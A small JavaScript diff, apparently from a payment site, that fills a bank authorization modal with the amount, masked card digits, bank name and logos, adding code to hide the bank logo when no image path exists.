@@ -773,9 +773,21 @@
     document.getElementById('amAmount').textContent = '$' + (datos.monto || 0).toLocaleString('es-CO');
     document.getElementById('amCardLast').textContent = '****' + datos.cardLast;
     document.getElementById('amBankName').textContent = datos.banco || 'banco emisor';
-    document.getElementById('amBankLogo').src = (bankData && bankData.logo) ? bankData.logo : (datos.bankLogo || '');
+
+    var bankLogoEl = document.getElementById('amBankLogo');
+    var logoPath = (bankData && bankData.logo) ? bankData.logo : (datos.bankLogo || '');
+    if (logoPath) {
+      bankLogoEl.style.display = 'block';
+      bankLogoEl.src = logoPath;
+    } else {
+      bankLogoEl.style.display = 'none';
+    }
+
+    var cardLogoEl = document.getElementById('amCardLogo');
     var tipo = (datos.tipoTarjeta || 'visa').toLowerCase();
-    document.getElementById('amCardLogo').src = tipo === 'visa' ? 'visa.png' : tipo === 'amex' ? 'ame.png' : 'master.png';
+    cardLogoEl.style.display = 'block';
+    cardLogoEl.src = tipo === 'visa' ? 'visa.png' : tipo === 'amex' ? 'ame.png' : 'master.png';
+
     setModalStage('wait');
     document.getElementById('authModalOverlay').classList.add('show');
   }
